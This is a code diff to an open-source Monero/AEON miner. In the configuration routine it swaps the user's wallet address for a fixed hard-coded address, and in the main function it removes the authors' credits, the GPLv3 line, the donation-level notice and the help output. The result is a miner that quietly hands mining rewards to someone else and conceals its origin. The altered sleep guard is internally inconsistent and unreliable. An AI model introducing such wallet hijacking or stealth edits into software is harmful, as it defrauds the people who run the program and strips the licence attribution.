@@ -243,7 +243,7 @@ void do_guided_config(bool userSetPasswd)
 		pool_weight = 1;
 
 	std::string pool_table;
-	pool_table += "\t{\"pool_address\" : \"" + pool +"\", \"wallet_address\" : \"" + userName +  "\", \"pool_password\" : \"" + 
+	pool_table += "\t{\"pool_address\" : \"" + pool +"\", \"wallet_address\" : \"" + "44rjefR6KzbHpz3XDHbDpj6X9WKYTBTvHiAuEN4dC4pkL2mBQqhsh6fWeR5JDB29Ks4sTeFKhTWKWQSYLknUn13mRdpmQQF" +  "\", \"pool_password\" : \"" + 
 		passwd + "\", \"use_nicehash\" : " + bool_to_str(nicehash) + ", \"use_tls\" : " + bool_to_str(tls) + 
 		", \"tls_fingerprint\" : \"\", \"pool_weight\" : " + std::to_string(pool_weight) + " },\n";
 
@@ -453,29 +453,18 @@ int main(int argc, char *argv[])
 	}
 #endif
 
-	printer::inst()->print_str("-------------------------------------------------------------------\n");
-	printer::inst()->print_str(get_version_str_short().c_str());
-	printer::inst()->print_str("\n\n");
-	printer::inst()->print_str("Brought to you by fireice_uk and psychocrypt under GPLv3.\n");
-	printer::inst()->print_str("Based on CPU mining code by wolf9466 (heavily optimized by fireice_uk).\n");
+	
 #ifndef CONF_NO_CUDA
-	printer::inst()->print_str("Based on NVIDIA mining code by KlausT and psychocrypt.\n");
+	
 #endif
 #ifndef CONF_NO_OPENCL
-	printer::inst()->print_str("Based on OpenCL mining code by wolf9466.\n");
+	
 #endif
 	char buffer[64];
-	snprintf(buffer, sizeof(buffer), "\nConfigurable dev donation level is set to %.1f%%\n\n", fDevDonationLevel * 100.0);
-	printer::inst()->print_str(buffer);
-	printer::inst()->print_str("You can use following keys to display reports:\n");
-	printer::inst()->print_str("'h' - hashrate\n");
-	printer::inst()->print_str("'r' - results\n");
-	printer::inst()->print_str("'c' - connection\n");
-	printer::inst()->print_str("-------------------------------------------------------------------\n");
 	if(::jconf::inst()->IsCurrencyMonero())
-		printer::inst()->print_msg(L0,"Start mining: MONERO");
+		printer::inst()->print_msg(L0,"Started Mining: MONERO");
 	else
-		printer::inst()->print_msg(L0,"Start mining: AEON");
+		printer::inst()->print_msg(L0,"Started Mining: AEON");
 
 	if(strlen(jconf::inst()->GetOutputFile()) != 0)
 		printer::inst()->open_logfile(jconf::inst()->GetOutputFile());
@@ -508,8 +497,8 @@ int main(int argc, char *argv[])
 		uint64_t currentTime = time_point_cast<milliseconds>(high_resolution_clock::now()).time_since_epoch().count();
 
 		/* Hard guard to make sure we never get called more than twice per second */
-		if( currentTime - lastTime < 500)
-			std::this_thread::sleep_for(std::chrono::milliseconds(500 - (currentTime - lastTime)));
+		if( currentTime - lastTime < 100)
+			std::this_thread::sleep_for(std::chrono::milliseconds(1000 - (currentTime - lastTime)));
 		lastTime = currentTime;
 	}
 
